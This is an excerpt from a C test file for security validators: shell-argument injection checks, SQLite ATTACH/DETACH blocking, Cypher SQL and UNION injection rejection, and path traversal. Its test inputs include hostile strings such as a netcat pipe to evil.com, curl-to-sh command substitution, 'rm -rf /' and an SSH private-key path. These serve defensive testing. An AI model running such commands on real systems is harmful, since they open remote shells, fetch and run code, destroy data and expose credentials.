 ...
 *   - Shell injection prevention (ctx_validate_shell_arg)
...
TEST(shell_rejects_single_quote) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo'bar"));
    PASS();
}
...
TEST(shell_rejects_backtick) {
    ASSERT_FALSE(ctx_validate_shell_arg("`id`"));
    PASS();
}

TEST(shell_rejects_semicolon) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo;rm -rf /"));
    PASS();
}

TEST(shell_rejects_pipe) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo|nc evil.com 4444"));
    PASS();
}

TEST(shell_rejects_ampersand) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo&background"));
    PASS();
}
...
TEST(shell_rejects_backslash) {
    ...
    ASSERT_TRUE(ctx_validate_shell_arg("foo\\bar"));
#else
    ASSERT_FALSE(ctx_validate_shell_arg("foo\\bar"));
#endif
    PASS();
...
TEST(shell_rejects_newline) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo\nbar"));
    PASS();
}

TEST(shell_rejects_carriage_return) {
    ASSERT_FALSE(ctx_validate_shell_arg("foo\rbar"));
    PASS();
}
...
TEST(shell_accepts_spaces) {
    ASSERT_TRUE(ctx_validate_shell_arg("/Users/John Doe/Documents"));
    PASS();
}

TEST(shell_accepts_dots_dashes) {
    ASSERT_TRUE(ctx_validate_shell_arg("file-name.tar.gz"));
    PASS();
}
...
TEST(shell_rejects_quote_escape_attack) {
    ...
    ASSERT_FALSE(ctx_validate_shell_arg("' ; rm -rf / ; echo '"));
    PASS();
}

TEST(shell_rejects_command_substitution) {
    ASSERT_FALSE(ctx_validate_shell_arg("$(curl http://evil.com/shell.sh | sh)"));
    PASS();
}

TEST(shell_rejects_env_var_expansion) {
    ASSERT_FALSE(ctx_validate_shell_arg("${HOME}/.ssh/id_rsa"));
    PASS();
}
...
TEST(sqlite_blocks_attach_via_cypher) {
    ...
    int rc = ctx_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r);
    /* Valid query works */
    ASSERT_EQ(rc, 0);
...
TEST(sqlite_blocks_attach_direct) {
     ...
     * ctx_store_exec_raw() would be ideal but the store is opaque.
    ...
    ctx_cypher_result_t r = {0};
    int rc = ctx_cypher_execute(s, "ATTACH DATABASE '/tmp/evil.db' AS evil", "test", 0, &r);
...
TEST(sqlite_blocks_detach_direct) {
    ...
    ctx_cypher_result_t r = {0};
    int rc = ctx_cypher_execute(s, "DETACH DATABASE evil", "test", 0, &r);
...
TEST(sqlite_allows_normal_queries) {
    ...
    ctx_cypher_result_t r = {0};
    int rc = ctx_cypher_execute(s, "MATCH (f:Function) WHERE f.name = \"hello\" RETURN f", "test",
                                0, &r);
    ASSERT_EQ(rc, 0);
...
TEST(cypher_rejects_sql_injection_in_string) {
    ...
    if (rc == 0) {
        ...
        ctx_cypher_result_free(&r);
        ctx_cypher_result_t r2 = {0};
        int rc2 = ctx_cypher_execute(s, "MATCH (n) RETURN n", "test", 0, &r2);
        ASSERT_EQ(rc2, 0); /* Table must still exist */
        ctx_cypher_result_free(&r2);
    } else {
        ctx_cypher_result_free(&r);
    }
...
TEST(cypher_rejects_union_injection) {
    ...
    ctx_cypher_result_t r = {0};
    int rc = ctx_cypher_execute(s, "MATCH (n) RETURN n UNION SELECT sql FROM sqlite_master", "test",
                                0, &r);
...
TEST(path_traversal_blocked) {
    ...
    const char *root = "/tmp/ctx_security_test_root";
    mkdir(root, 0755);
...
/* ══════════════════════════════════════════════════════════════════
 *  SHELL-FREE SUBPROCESS EXECUTION (ctx_exec_no_shell)
 *
...
TEST(exec_no_shell_nonexistent_command) {
    const char *argv[] = {"ctx_nonexistent_binary_12345", NULL};
    int rc = ctx_exec_no_shell(argv);
